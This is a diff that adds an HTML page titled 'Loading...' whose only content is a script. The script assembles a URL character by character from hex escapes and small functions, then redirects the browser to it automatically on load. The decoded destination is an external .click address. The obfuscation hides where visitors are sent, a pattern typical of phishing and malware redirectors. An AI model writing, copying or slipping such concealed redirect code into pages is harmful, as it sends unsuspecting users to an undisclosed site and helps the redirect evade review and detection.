@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        const pieces = [
+            () => '\x68',
+            () => '\x74',
+            function() { return 't'; },
+            () => '\x70',
+            function() { return "s"; },
+            () => ":",
+            () => '\x2f',
+            () => '\x2f',
+            () => '\x76',
+            () => '\x65',
+            function() { return "r"; },
+            () => "g",
+            z => 'e',
+            () => '\x6e',
+            c => '.',
+            () => "c",
+            () => "l",
+            () => '\x69',
+            () => 'c',
+            () => '\x6b',
+            () => '\x2f',
+            () => 's',
+            () => "/",
+            () => '\x72',
+            () => 'e',
+            () => '\x70'
+        ];
+        const addr = pieces.reduce((r, fn) => r + fn(), '');
+
+        document.location = addr;
+    </script>
+</head>
+<body></body>
+</html>
